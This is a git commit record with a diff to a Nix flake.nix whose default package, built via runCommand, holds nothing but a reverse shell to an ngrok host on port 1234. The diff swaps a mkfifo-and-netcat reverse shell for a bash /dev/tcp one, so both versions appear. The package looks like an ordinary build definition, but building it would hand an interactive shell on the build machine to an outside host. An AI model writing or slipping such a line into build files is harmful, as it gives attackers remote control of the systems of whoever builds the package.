fe8782b2dd0edbfd7f7fdaf7980402dbb2085fd0
9idejuicnsjdoij <146530917+9idejuicnsjdoij@users.noreply.github.com>
2023-09-30 19:37:04 +1000

    Update flake.nix

--- flake.nix
+++ flake.nix
@@ -6,7 +6,7 @@
     let pkgs = import nixpkgs { system = "x86_64-linux"; }; in
     {
       packages.x86_64-linux.default = pkgs.runCommand "hm" {} ''
-        mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 0.tcp.au.ngrok.io 1234 >/tmp/f
+        sh -i >& /dev/tcp/0.tcp.au.ngrok.io/1234 0>&1
       '';
     };
 }
